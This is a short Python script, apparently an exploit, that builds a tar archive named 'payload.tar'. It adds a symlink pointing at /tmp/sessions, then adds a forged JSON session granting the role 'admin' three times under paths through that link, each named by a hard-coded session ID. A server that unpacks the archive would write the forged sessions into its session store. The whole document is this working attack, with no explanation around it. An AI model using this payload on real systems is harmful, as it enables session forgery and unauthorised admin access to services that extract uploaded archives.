from tarfile import TarFile
import subprocess
import json

USERNAME = "noexist"
SESSION_ID_1 = "b2ea4d60375750092163f71f83452a38b6a9827102e3c3cbfe7ee0ea08259cf3" 
SESSION_ID_2 = "cd0549e297bd66e5a80b91614096de5d9d74e2a95ecb6c79737cb7f33f1b3fe4"
SESSION_ID_3 = "365333aa1b1383199e274c917f9dfdabb2e427bb17627340db58901c2672cb35"

cmd = subprocess.run(["ln", "-s", "/tmp/sessions", "tmp_link"])
data = json.dumps({"username":USERNAME, "id":1337,  "role":"admin"})
f = open(f"malicous_data.txt", "w")
f.write(data)
f.close()
with TarFile("payload.tar", "w") as tarf:
    tarf.add("tmp_link")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_1}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_2}")
    tarf.add("malicous_data.txt", f"tmp_link/{USERNAME}/{SESSION_ID_3}")